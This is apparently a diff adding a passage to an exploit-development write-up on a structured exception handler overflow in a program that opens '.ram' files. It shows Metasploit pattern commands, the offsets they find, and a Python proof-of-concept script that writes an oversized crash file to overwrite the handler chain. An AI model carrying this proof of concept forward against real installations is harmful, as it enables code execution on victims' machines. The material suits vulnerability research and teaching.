@@ -42,3 +42,48 @@ Select the file created by the script, making the program to load the malicious 
 SEH Chain:
 
 ![](/assets/img/Findings2/4.png)
+
+A pattern is created with msf-pattern_create into a file called "pattern":
+
+```term_session
+root@kali:~# msf-pattern_create -l 50000 > pattern 
+root@kali:~# 
+```
+
+Such chain of bytes is copied into the PoC.
+
+Updated PoC:
+
+![](/assets/img/Findings2/5.png)
+
+After this is copied, executed and finally selected by the program, the SEH Chain gives the next values:
+
+![](/assets/img/Findings2/6.png)
+
+The nSEH value is copied and the offset is found using msf-pattern_offset:
+
+```term_session
+root@kali:~# msf-pattern_offset -q 66473965 -l 50000 
+[*] Exact match at offset 4828
+[*] Exact match at offset 25108
+[*] Exact match at offset 45388
+root@kali:~# 
+```
+
+As it is seen on the image, the program outputs different offsets, let's try with the last one, 45388.
+
+Updated PoC:
+
+```term_session
+import struct
+
+buffer = "A" * 45388 + "BBBB" + "CCCC"
+
+f = open ("finding2.ram", "w")
+f.write(buffer)
+f.close()
+```
+
+After the aforementioned process is once again repeated, the SEH Chain is overwritten by the desired values:
+
+![](/assets/img/Findings2/7.png)
